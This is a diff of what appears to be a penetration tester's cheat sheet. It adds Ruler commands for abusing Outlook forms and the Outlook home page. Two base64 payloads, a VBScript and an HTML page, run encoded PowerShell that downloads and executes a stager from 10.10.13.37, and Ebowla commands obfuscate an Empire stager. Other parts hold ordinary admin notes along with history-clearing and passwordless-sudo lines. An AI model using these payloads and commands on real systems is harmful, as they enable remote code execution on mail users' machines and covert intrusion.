+#### Rules
+
+* [https://github.com/sensepost/ruler/wiki/Rules](https://github.com/sensepost/ruler/wiki/Rules)
+* [https://silentbreaksecurity.com/malicious-outlook-rules/](https://silentbreaksecurity.com/malicious-outlook-rules/)
+
+
+#### Forms
+
+* [https://github.com/sensepost/ruler/wiki/Forms](https://github.com/sensepost/ruler/wiki/Forms)
+* [https://sensepost.com/blog/2017/outlook-forms-and-shells/](https://sensepost.com/blog/2017/outlook-forms-and-shells/)
+
+Display forms:
+
+```
+$ ./ruler -k --nocache --url https://autodiscover.megacorp.com/autodiscover/autodiscover.xml -d megacorp.com -u 'snovvcrash' -p 'Passw0rd!' -e snovvcrash@megacorp.com --verbose --debug form display
+```
+
+Exploit:
+
+```
+$ ./ruler -k --nocache --url https://autodiscover.megacorp.com/autodiscover/autodiscover.xml -d megacorp.com -u 'snovvcrash' -p 'Passw0rd!' -e snovvcrash@megacorp.com --verbose --debug form add --suffix test-form --input vbs-payload.txt --send
+```
+
+```(vbs-payload.txt.b64)
+Q3JlYXRlT2JqZWN0KCJXU2NyaXB0LlNoZWxsIikuUnVuICJwb3dlcnNoZWxsIC1leGVjIGJ5cGFzcyAtZW5jIEpBQndBSElBYndCNEFIa0FRUUJrQUdRQWNnQTlBQ2dBUndCbEFIUUFMUUJKQUhRQVpRQnRBRkFBY2dCdkFIQUFaUUJ5QUhRQWVRQWdBQ0lBU0FCTEFFTUFWUUE2QUZ3QVV3QnZBR1lBZEFCM0FHRUFjZ0JsQUZ3QVRRQnBBR01BY2dCdkFITUFid0JtQUhRQVhBQlhBR2tBYmdCa0FHOEFkd0J6QUZ3QVF3QjFBSElBY2dCbEFHNEFkQUJXQUdVQWNnQnpBR2tBYndCdUFGd0FTUUJ1QUhRQVpRQnlBRzRBWlFCMEFDQUFVd0JsQUhRQWRBQnBBRzRBWndCekFDSUFLUUF1QUZBQWNnQnZBSGdBZVFCVEFHVUFjZ0IyQUdVQWNnQTdBQ1FBY0FCeUFHOEFlQUI1QUQwQVRnQmxBSGNBTFFCUEFHSUFhZ0JsQUdNQWRBQWdBRk1BZVFCekFIUUFaUUJ0QUM0QVRnQmxBSFFBTGdCWEFHVUFZZ0JRQUhJQWJ3QjRBSGtBT3dBa0FIQUFjZ0J2QUhnQWVRQXVBRUVBWkFCa0FISUFaUUJ6QUhNQVBRQWtBSEFBY2dCdkFIZ0FlUUJCQUdRQVpBQnlBRHNBSkFCd0FISUFid0I0QUhrQUxnQlZBSE1BWlFCRUFHVUFaZ0JoQUhVQWJBQjBBRU1BY2dCbEFHUUFaUUJ1QUhRQWFRQmhBR3dBY3dBOUFDUUFkQUJ5QUhVQVpRQTdBQ1FBWXdCc0FHa0FaUUJ1QUhRQVBRQk9BR1VBZHdBdEFFOEFZZ0JxQUdVQVl3QjBBQ0FBVXdCNUFITUFkQUJsQUcwQUxnQk9BR1VBZEFBdUFGY0FaUUJpQUVNQWJBQnBBR1VBYmdCMEFEc0FKQUJqQUd3QWFRQmxBRzRBZEFBdUFGQUFjZ0J2QUhnQWVRQTlBQ1FBY0FCeUFHOEFlQUI1QURzQUpBQmpBR3dBYVFCbEFHNEFkQUF1QUVRQWJ3QjNBRzRBYkFCdkFHRUFaQUJHQUdrQWJBQmxBQ2dBSWdCb0FIUUFkQUJ3QURvQUx3QXZBREVBTUFBdUFERUFNQUF1QURFQU13QXVBRE1BTndBdkFHZ0FkQUIwQUhBQWN3QTBBRFFBTXdBdUFHVUFlQUJsQUNJQUxBQWlBQ1FBWlFCdUFIWUFPZ0IxQUhNQVpRQnlBSEFBY2dCdkFHWUFhUUJzQUdVQVhBQnRBSFVBY3dCcEFHTUFYQUJvQUhRQWRBQndBSE1BTkFBMEFETUFMZ0JsQUhnQVpRQWlBQ2tBT3dBa0FHVUFlQUJsQUdNQVBRQk9BR1VBZHdBdEFFOEFZZ0JxQUdVQVl3QjBBQ0FBTFFCakFHOEFiUUFnQUhNQWFBQmxBR3dBYkFBdUFHRUFjQUJ3QUd3QWFRQmpBR0VBZEFCcEFHOEFiZ0E3QUNRQVpRQjRBR1VBWXdBdUFITUFhQUJsQUd3QWJBQmxBSGdBWlFCakFIVUFkQUJsQUNnQUlnQWtBR1VBYmdCMkFEb0FkUUJ6QUdVQWNnQndBSElBYndCbUFHa0FiQUJsQUZ3QWJRQjFBSE1BYVFCakFGd0FhQUIwQUhRQWNBQnpBRFFBTkFBekFDNEFaUUI0QUdVQUlnQXBBQW9BIiwgMCwgZmFsc2UK
+```
+
+Cleanup:
+
+```
+$ ./ruler -k --nocache --url https://autodiscover.megacorp.com/autodiscover/autodiscover.xml -d megacorp.com -u 'snovvcrash' -p 'Passw0rd!' -e snovvcrash@megacorp.com --verbose --debug form delete --suffix test-form
+```
+
+Empire stager encryption:
+
+```
+$ grep -e output_type -e payload_type -e clean_output -e userdomain genetic.config
+    output_type = GO
+    payload_type = DLL_x64
+    clean_output = True
+        userdomain = 'MEGACORP'
+$ python ebowla.py https443.dll genetic.config
+$ ./build_x64_go.sh output/go_symmetric_https443.dll.go https443.exe --hidden
+```
+
+
+#### Homepage
+
+* [https://github.com/sensepost/ruler/wiki/Homepage](https://github.com/sensepost/ruler/wiki/Homepage)
+* [https://sensepost.com/blog/2017/outlook-home-page-another-ruler-vector/](https://sensepost.com/blog/2017/outlook-home-page-another-ruler-vector/)
+
+Exploit:
+
+```
+$ ./ruler -k --nocache --url https://autodiscover.megacorp.com/autodiscover/autodiscover.xml -d megacorp.com -u 'snovvcrash' -p 'Passw0rd!' -e snovvcrash@megacorp.com --verbose --debug homepage add --url http://10.10.13.37/homepage.html
+```
+
+```(homepage.html.b64)
+PGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LUxhbmd1YWdlIiBjb250ZW50PSJlbi11cyI+CjxtZXRhIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PXdpbmRvd3MtMTI1MiI+Cjx0aXRsZT5PdXRsb29rPC90aXRsZT4KPHNjcmlwdCBpZD1jbGllbnRFdmVudEhhbmRsZXJzVkJTIGxhbmd1YWdlPXZic2NyaXB0Pgo8IS0tCiBTdWIgd2luZG93X29ubG9hZCgpCiAgICAgU2V0IEFwcGxpY2F0aW9uID0gVmlld0N0bDEuT3V0bG9va0FwcGxpY2F0aW9uCiAgICAgU2V0IGNtZCA9IEFwcGxpY2F0aW9uLkNyZWF0ZU9iamVjdCgiV3NjcmlwdC5TaGVsbCIpCiAgICAgY21kLlJ1bigicG93ZXJzaGVsbCAtZXhlYyBieXBhc3MgLWUgSkFCd0FISUFid0I0QUhrQVFRQmtBR1FBY2dBOUFDZ0FSd0JsQUhRQUxRQkpBSFFBWlFCdEFGQUFjZ0J2QUhBQVpRQnlBSFFBZVFBZ0FDSUFTQUJMQUVNQVZRQTZBRndBVXdCdkFHWUFkQUIzQUdFQWNnQmxBRndBVFFCcEFHTUFjZ0J2QUhNQWJ3Qm1BSFFBWEFCWEFHa0FiZ0JrQUc4QWR3QnpBRndBUXdCMUFISUFjZ0JsQUc0QWRBQldBR1VBY2dCekFHa0Fid0J1QUZ3QVNRQnVBSFFBWlFCeUFHNEFaUUIwQUNBQVV3QmxBSFFBZEFCcEFHNEFad0J6QUNJQUtRQXVBRkFBY2dCdkFIZ0FlUUJUQUdVQWNnQjJBR1VBY2dBN0FDUUFjQUJ5QUc4QWVBQjVBRDBBVGdCbEFIY0FMUUJQQUdJQWFnQmxBR01BZEFBZ0FGTUFlUUJ6QUhRQVpRQnRBQzRBVGdCbEFIUUFMZ0JYQUdVQVlnQlFBSElBYndCNEFIa0FPd0FrQUhBQWNnQnZBSGdBZVFBdUFFRUFaQUJrQUhJQVpRQnpBSE1BUFFBa0FIQUFjZ0J2QUhnQWVRQkJBR1FBWkFCeUFEc0FKQUJ3QUhJQWJ3QjRBSGtBTGdCVkFITUFaUUJFQUdVQVpnQmhBSFVBYkFCMEFFTUFjZ0JsQUdRQVpRQnVBSFFBYVFCaEFHd0Fjd0E5QUNRQWRBQnlBSFVBWlFBN0FDUUFZd0JzQUdrQVpRQnVBSFFBUFFCT0FHVUFkd0F0QUU4QVlnQnFBR1VBWXdCMEFDQUFVd0I1QUhNQWRBQmxBRzBBTGdCT0FHVUFkQUF1QUZjQVpRQmlBRU1BYkFCcEFHVUFiZ0IwQURzQUpBQmpBR3dBYVFCbEFHNEFkQUF1QUZBQWNnQnZBSGdBZVFBOUFDUUFjQUJ5QUc4QWVBQjVBRHNBSkFCakFHd0FhUUJsQUc0QWRBQXVBRVFBYndCM0FHNEFiQUJ2QUdFQVpBQkdBR2tBYkFCbEFDZ0FJZ0JvQUhRQWRBQndBRG9BTHdBdkFERUFNQUF1QURFQU1BQXVBREVBTXdBdUFETUFOd0F2QUhNQWRBQmhBR2NBWlFCeUFEWUFOQUF1QUdRQWJBQnNBQ0lBTEFBaUFDUUFaUUJ1QUhZQU9nQjFBSE1BWlFCeUFIQUFjZ0J2QUdZQWFRQnNBR1VBWEFCdEFIVUFjd0JwQUdNQVhBQnpBSFFBWVFCbkFHVUFjZ0EyQURRQUxnQmtBR3dBYkFBaUFDa0FPd0FrQUdVQWVBQmxBR01BUFFCT0FHVUFkd0F0QUU4QVlnQnFBR1VBWXdCMEFDQUFMUUJqQUc4QWJRQWdBSE1BYUFCbEFHd0FiQUF1QUdFQWNBQndBR3dBYVFCakFHRUFkQUJwQUc4QWJnQTdBQ1FBWlFCNEFHVUFZd0F1QUhNQWFBQmxBR3dBYkFCbEFIZ0FaUUJqQUhVQWRBQmxBQ2dBSWdCeUFIVUFiZ0JrQUd3QWJBQXpBRElBSWdBc0FDSUFKQUJsQUc0QWRnQTZBSFVBY3dCbEFISUFjQUJ5QUc4QVpnQnBBR3dBWlFCY0FHMEFkUUJ6QUdrQVl3QmNBSE1BZEFCaEFHY0FaUUJ5QURZQU5BQXVBR1FBYkFCc0FDSUFLUUFLQUE9PSIpCiBFbmQgU3ViCi0tPgoKPC9zY3JpcHQ+CjwvaGVhZD4KCjxib2R5PgogPG9iamVjdCBjbGFzc2lkPSJjbHNpZDowMDA2RjA2My0wMDAwLTAwMDAtQzAwMC0wMDAwMDAwMDAwNDYiIGlkPSJWaWV3Q3RsMSIgZGF0YT0iIiB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIj48L29iamVjdD4KPC9ib2R5Pgo8L2h0bWw+Cg==
+```
+
+Cleanup:
+
+```
+$ ./ruler -k --nocache --url https://autodiscover.megacorp.com/autodiscover/autodiscover.xml -d megacorp.com -u 'snovvcrash' -p 'Passw0rd!' -e snovvcrash@megacorp.com --verbose --debug homepage delete
+```
+
+Stager encryption is the same as for Ruler/Forms.
 
 
 
@@ -5761,10 +5988,28 @@ $ twine upload dist/*
 
 
 
-### bpython
+### Fix Python 2.7 Registry
 
 ```
-$ python3 -m pip install bpython
+Windows Registry Editor Version 5.00
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Python\PythonCore\2.7]
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Python\PythonCore\2.7\Help]
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Python\PythonCore\2.7\Help\MainPythonDocumentation]
+@="C:\\Python27\\Doc\\python26.chm"
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Python\PythonCore\2.7\InstallPath]
+@="C:\\Python27\\"
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Python\PythonCore\2.7\InstallPath\InstallGroup]
+@="Python 2.7"
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Python\PythonCore\2.7\Modules]
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Python\PythonCore\2.7\PythonPath]
+@="C:\\Python27\\Lib;C:\\Python27\\DLLs;C:\\Python27\\Lib\\lib-tk"
 ```
 
 
@@ -5996,12 +6241,11 @@ Mix settings list (both for hardware install and virtualization):
 		}
 [ALL] Configure sudo
 	* Increase sudo password timeout value or disable password prompt completely
+	$ sudo visudo
 		SWITCH {
 			CASE (increase timeout):
-				$ sudo visudo
 				"Defaults    env_reset,timestamp_timeout=45"
 			CASE (disable password):
-				$ sudo visudo
 				"snovvcrash ALL=(ALL) NOPASSWD: ALL"
 		}
 [ALL] Install cmake
@@ -6295,7 +6539,7 @@ $ cat /dev/null > ~/.bash_history && history -c && exit
 
 ```
 $ shred -zvu -n7 /path/to/file
-$ find /path/to/dir -type f -exec shred -zvu -n7 {} \;
+$ find /path/to/dir -type f -exec shred -zvu -n7 {} \\;
 $ shred -zv -n0 /dev/sdc1
 ```
 
@@ -6303,6 +6547,8 @@ $ shred -zv -n0 /dev/sdc1
 
 
 ## Partitions
+
+* [https://youtu.be/QSpGaeHlkoE](https://youtu.be/QSpGaeHlkoE)
 
 List devices:
 
@@ -6468,13 +6714,13 @@ $ convert img1.png img2.png -fx "(((255*u)&(255*(1-v)))|((255*(1-u))&(255*v)))/2
 Pack:
 
 ```
-tar -cvf filename.tar
+tar -cvf directory.tar directory
 ```
 
 Unpack:
 
 ```
-tar -xvf filename.tar
+tar -xvf directory.tar directory
 ```
 
 
@@ -6483,13 +6729,13 @@ tar -xvf filename.tar
 Pack:
 
 ```
-tar -cvzf filename.tar.gz
+tar -cvzf directory.tar.gz directory
 ```
 
 Unpack:
 
 ```
-tar -xvzf filename.tar.gz
+tar -xvzf directory.tar.gz directory
 ```
 
 
@@ -6498,13 +6744,13 @@ tar -xvzf filename.tar.gz
 Pack:
 
 ```
-tar -cvjf filename.tar.bz
+tar -cvjf directory.tar.bz directory
 ```
 
 Unpack:
 
 ```
-tar -xvjf filename.tar.bz
+tar -xvjf directory.tar.bz directory
 ```
 
 
@@ -6608,7 +6854,7 @@ $ sudo fail2ban-client unban --all
 
 
 
-### Git
+### git
 
 Update to latest version:
 
@@ -6645,6 +6891,16 @@ $ git checkout -b new-pull-request
 ...Make changes...
 $ gc -am "New pull request"
 $ git push -u origin new-pull-request
+```
+
+
+### veracrypt
+
+* [https://www.veracrypt.fr/en/Downloads.html](https://www.veracrypt.fr/en/Downloads.html)
+
+```
+$ veracrypt -t --pim=0 --keyfiles='' --protect-hidden=no /home/snovvcrash/AngaraTech.dat /mnt
+$ veracrypt -d
 ```
 
 
@@ -6895,4 +7151,15 @@ Cmd > rmdir /S /Q C:\$Windows.~BT\
 
 ```
 Cmd > DISM /online /Enable-Feature /FeatureName:TelnetClient
+```
+
+
+
+
+## BitLocker
+
+Check encryption status of all drives (must be elevated):
+
+```
+Cmd > manage-bde -status
 ```
